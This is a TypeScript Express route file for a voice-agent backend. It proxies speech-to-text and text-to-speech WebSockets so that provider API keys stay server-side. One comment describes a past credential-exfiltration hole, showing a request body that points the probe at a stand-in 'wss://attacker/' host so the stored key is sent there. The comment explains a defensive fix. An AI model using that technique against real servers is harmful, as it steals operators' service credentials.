// External voice agent endpoints.
//
// A different model from /api/realtime (OpenAI Realtime, speech-to-speech):
// this one wires three independent services together
//   1. STT (browser audio → text) — WebSocket PROXIED by this backend
//   2. LLM (text → text)         — call routed through the regular /api/agents/:id/chat
//   3. TTS (text → audio)        — WebSocket PROXIED by this backend
//
// Both URLs and API keys live in admin settings (sttServiceUrl, sttApiKey,
// ttsServiceUrl, ttsApiKey) and they STAY ON THIS SIDE. Audio DOES pass through
// this backend now: /config/:agentId hands the browser same-origin paths
// (/ws/voice/stt/:agentId, /ws/voice/tts/:agentId) and routes/voiceProxy.ts
// bridges each one to the provider, injecting the api_key server-side.
//
// This is the deliberate reversal of what this file used to say — "no audio
// passes through this backend, only credentials". That design shipped the
// operator's speech key, in clear, to every browser allowed to open a voice
// agent; on a multi-tenant instance it is a single provider credential handed
// to every tenant, replayable for as long as it lives. Relaying the PCM costs
// bandwidth, which is the cheaper half of the trade.
import express from 'express';
import { getSettings } from '../services/configManager.js';
import { requireRole, sessionUser } from '../middleware/auth.js';
import { checkAgentAccess } from '../lib/agentAccess.js';
import type { AgentManager } from '../services/agentManager/index.js';
import { asyncHandler } from '../lib/asyncHandler.js';
// buildWsUrl composes the key-bearing UPSTREAM url and now lives beside the only
// code that dials it; voiceProxyPath builds the same-origin path handed out
// instead. The dependency runs one way — this file imports the proxy, never the
// reverse — so the upgrade route and the config route cannot drift apart.
import { buildWsUrl, voiceProxyPath } from './voiceProxy.js';

export function externalVoiceRoutes(agentManager: AgentManager) {
  const router = express.Router();

  // Returns connection info for a given external-voice agent. `wsUrl` is a
  // SAME-ORIGIN PATH, not a provider URL: the browser turns it into
  // `${proto}//${location.host}${wsUrl}` and routes/voiceProxy.ts relays the
  // audio with the operator's key attached on this side. Nothing in this
  // response is a credential.
  router.get(
    '/config/:agentId',
    asyncHandler(async (req, res) => {
      const agentId = req.params.agentId;
      const agent = agentManager.agents.get(agentId);
      if (!agent) {
        res.status(404).json({ error: 'Agent not found' });
        return;
      }
      // :agentId is caller-supplied, and the paths below open a socket that
      // spends the operator's speech credential, so this is gated on the same
      // rule as every other agent surface. voiceProxy.ts re-runs this exact
      // check on the upgrade: the path is an address, never a capability.
      const user = sessionUser(req, res);
      if (!user) return;
      const access = await checkAgentAccess(agent, user, 'read');
      if (!access.ok) {
        res.status(access.status || 403).json({ error: access.error });
        return;
      }
      if (!agent.isVoice || agent.voiceMode !== 'external') {
        res.status(400).json({ error: 'Agent is not an external voice agent' });
        return;
      }

      const settings = await getSettings();
      // Availability, read off the URLs alone. This handler never composes the
      // key-bearing upstream URL at all — voiceProxy.ts rebuilds it when a
      // socket is actually opened, which is the only place it is needed.
      const sttConfigured = Boolean(settings.sttServiceUrl);
      const ttsConfigured = Boolean(settings.ttsServiceUrl);

      if (!sttConfigured || !ttsConfigured) {
        res.status(503).json({
          error:
            'STT/TTS services are not configured. Set sttServiceUrl and ttsServiceUrl in Admin Settings.',
        });
        return;
      }

      res.json({
        stt: {
          available: true,
          wsUrl: voiceProxyPath('stt', agentId),
          sampleRate: 16000,
          encoding: 'pcm16',
          channels: 1,
        },
        tts: {
          available: true,
          wsUrl: voiceProxyPath('tts', agentId),
          sampleRate: 22050,
          encoding: 'pcm16',
          channels: 1,
          voiceId: agent.ttsVoiceId || settings.ttsVoiceId || '',
        },
        llmConfigId: agent.llmConfigId || null,
      });
    })
  );

  // Returns the global STT/TTS service availability and WS URLs so that the
  // regular text chat (any agent) can offer mic-input (STT) and spoken reply
  // (TTS). Unlike /config/:agentId, this route does not require the agent to
  // be a voice agent — it just exposes whatever the operator configured.
  // The per-agent ttsVoiceId is used when an agentId is provided.
  //
  // This route used to hand the browser provider URLs with `api_key=<operator
  // key>` in the query — the same leak /config/:agentId had, and on the hotter
  // path: ChatTab and agentDetail/SettingsTab both call it on mount, so every
  // authenticated user read the instance's STT/TTS credential. It now returns
  // the proxy path like /config does.
  //
  // The leg it points at is session-scoped rather than agent-scoped, because
  // this route answers with no agent in hand (agentId is optional and is only
  // a voice personalisation). That is not a weakening: the gate is exactly what
  // this route already enforced — a valid session, nothing more.
  router.get(
    '/services',
    asyncHandler(async (req, res) => {
      const settings = await getSettings();
      // Same reversal as /config: the browser is handed OUR path, never the
      // provider URL with the operator's key in it. This flow names no agent,
      // so it uses the session-scoped leg — which is the authorization this
      // route already had (`authenticateToken`, mounted in index.ts).
      const sttUrl = settings.sttServiceUrl ? voiceProxyPath('stt') : null;
      const ttsUrl = settings.ttsServiceUrl ? voiceProxyPath('tts') : null;

      let voiceId = settings.ttsVoiceId || '';
      const agentId = typeof req.query.agentId === 'string' ? req.query.agentId : null;
      if (agentId) {
        const user = sessionUser(req, res);
        if (!user) return;
        const agent = agentManager.agents.get(agentId);
        // The per-agent override is a personalisation, not a permission: an
        // agentId the caller may not read silently falls back to the global voice
        // rather than 403-ing, so a stale id in the UI cannot break text chat.
        if (agent && agent.ttsVoiceId) {
          const access = await checkAgentAccess(agent, user, 'read');
          if (access.ok) voiceId = agent.ttsVoiceId;
        }
      }

      res.json({
        stt: sttUrl
          ? { available: true, wsUrl: sttUrl, sampleRate: 16000, encoding: 'pcm16', channels: 1 }
          : { available: false },
        tts: ttsUrl
          ? {
              available: true,
              wsUrl: ttsUrl,
              sampleRate: 22050,
              encoding: 'pcm16',
              channels: 1,
              voiceId,
            }
          : { available: false },
      });
    })
  );

  // Quick connectivity probe — opens the WS, waits for the server's first
  // ack, then closes. Used by Admin Settings "Test connection" buttons.
  // Body: { url, apiKey } — when omitted, falls back to the saved settings
  // for the given service ("stt" or "tts").
  async function probeWebSocket(
    wsUrl: string,
    timeoutMs = 5000
  ): Promise<{ ok: boolean; error?: string; latencyMs?: number }> {
    if (typeof (globalThis as any).WebSocket === 'undefined') {
      return {
        ok: false,
        error: 'Node WebSocket API not available on this server (Node >= 22 required).',
      };
    }
    return new Promise(resolve => {
      let settled = false;
      const start = Date.now();
      let ws: any;
      const timer = setTimeout(() => {
        if (settled) return;
        settled = true;
        try {
          ws?.close();
        } catch {}
        resolve({ ok: false, error: `Timeout after ${timeoutMs}ms` });
      }, timeoutMs);
      try {
        ws = new (globalThis as any).WebSocket(wsUrl);
      } catch (err: any) {
        clearTimeout(timer);
        return resolve({ ok: false, error: err?.message || 'Invalid URL' });
      }
      ws.addEventListener('open', () => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        const latencyMs = Date.now() - start;
        try {
          ws.close(1000, 'probe');
        } catch {}
        resolve({ ok: true, latencyMs });
      });
      ws.addEventListener('error', (ev: any) => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        try {
          ws.close();
        } catch {}
        resolve({ ok: false, error: ev?.message || 'WebSocket error' });
      });
      ws.addEventListener('close', (ev: any) => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        if (ev?.code && ev.code !== 1000) {
          resolve({
            ok: false,
            error: `Closed with code ${ev.code}${ev.reason ? `: ${ev.reason}` : ''}`,
          });
        } else {
          resolve({ ok: true, latencyMs: Date.now() - start });
        }
      });
    });
  }

  // Admin-only, and the stored key is NEVER paired with a caller-supplied URL.
  //
  // Both halves matter. Without the role guard any authenticated user reached
  // this. Without the pairing rule, a body of `{ "url": "wss://attacker/" }`
  // with no apiKey made the server build `wss://attacker/?api_key=<stored key>`
  // and CONNECT to it — a complete exfiltration primitive for the operator's
  // speech credentials, needing nothing but a session.
  //
  // The rule below keeps every real use working, because the Admin Settings
  // form always posts both fields (admin/SettingsTab.tsx): saved settings are
  // probed by omitting the body, and a not-yet-saved URL is probed with the key
  // typed beside it. Only the combination nobody legitimately needs — someone
  // else's URL plus our key — is refused.
  router.post(
    '/test/:service',
    requireRole('admin'),
    asyncHandler(async (req, res) => {
      const service = String(req.params.service || '').toLowerCase();
      if (service !== 'stt' && service !== 'tts') {
        res.status(400).json({ ok: false, error: 'Service must be "stt" or "tts"' });
        return;
      }
      const settings = await getSettings();
      const callerUrl =
        typeof req.body?.url === 'string' && req.body.url.trim() ? req.body.url.trim() : null;
      const callerKey = typeof req.body?.apiKey === 'string' ? req.body.apiKey : null;
      const storedUrl = service === 'stt' ? settings.sttServiceUrl : settings.ttsServiceUrl;
      const storedKey = service === 'stt' ? settings.sttApiKey : settings.ttsApiKey;

      const url = callerUrl ?? storedUrl;
      // The stored credential follows the stored URL and nothing else. A caller
      // who names the destination must also name the key, or the probe goes out
      // unauthenticated — which fails honestly rather than leaking.
      const apiKey = callerKey ?? (callerUrl ? '' : storedKey);

      if (!url) {
        res.status(400).json({ ok: false, error: `${service.toUpperCase()} URL is not set` });
        return;
      }
      const fullUrl = buildWsUrl(url, apiKey || '');
      if (!fullUrl) {
        res.status(400).json({ ok: false, error: 'Could not build a valid WebSocket URL' });
        return;
      }
      const result = await probeWebSocket(fullUrl);
      res.json(result);
    })
  );

  return router;
}
